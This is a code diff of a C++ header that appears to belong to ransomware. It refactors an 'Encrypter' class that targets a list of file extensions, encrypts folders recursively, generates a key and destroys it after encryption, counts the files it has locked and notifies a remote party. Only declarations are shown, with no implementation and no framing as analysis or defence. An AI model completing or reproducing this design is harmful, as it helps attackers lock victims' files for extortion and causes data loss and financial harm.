@@ -15,40 +15,48 @@ const char extensions[][7] = {
   "wmv", "xls", "xml", "xps", "zip"
 };
 
+enum option { ENCRYPT, DECRYPT };
+typedef const char* string;
+typedef unsigned int uint;
+
 class IController {
+private:
+  virtual void encryptFile(string) = 0;
+  virtual void decryptFile(string) = 0;
 public:
-  virtual void generateKey() = 0;
-  virtual void encrypt(const char*) = 0;
-  virtual void decrypt(const char*, uint8_t*) = 0;
-  virtual void destroyKey() = 0;
-  virtual unsigned int getCantEncrypted() = 0;
-  virtual unsigned int getCantDecrypted() = 0;
+  virtual void setKey(uint8_t*) = 0; // for decryption key, use before decrypt
+  virtual void generateKey() = 0; // encryption key
+  virtual void destroyKey() = 0; // for encryption key, use after encrypt
+  virtual void recursive(option, string) = 0; // encrypt/decrypt folder
+  virtual uint getCantEncrypted() = 0;
+  virtual uint getCantDecrypted() = 0;
 };
 
 class Encrypter : public IController {
 private:
   uint8_t* key;
-  char* id;
-  unsigned int len;
-  unsigned int cant_encrypted;
-  unsigned int cant_decrypted;
+  uint cant_encrypted;
+  uint cant_decrypted;
 
-  void encryptFile(char*);
-  void decryptFile(char*);
-  void AES_stream_encrypt(char*);
-  void AES_stream_decrypt(char*);
-  void notify(const char*);
+  char* id;
+  uint len;
+  void notify(string);
+
+  void AES_stream_encrypt(string);
+  void AES_stream_decrypt(string);
 
   static Encrypter* instance;
   Encrypter();
+  virtual void encryptFile(string);
+  virtual void decryptFile(string);
 public:
   static Encrypter* getInstance();
+  virtual void setKey(uint8_t*);
   virtual void generateKey();
-  virtual void encrypt(const char*);
-  virtual void decrypt(const char*, uint8_t*);
   virtual void destroyKey();
-  virtual unsigned int getCantEncrypted();
-  virtual unsigned int getCantDecrypted();
+  virtual void recursive(option, string);
+  virtual uint getCantEncrypted();
+  virtual uint getCantDecrypted();
 };
 
 #endif
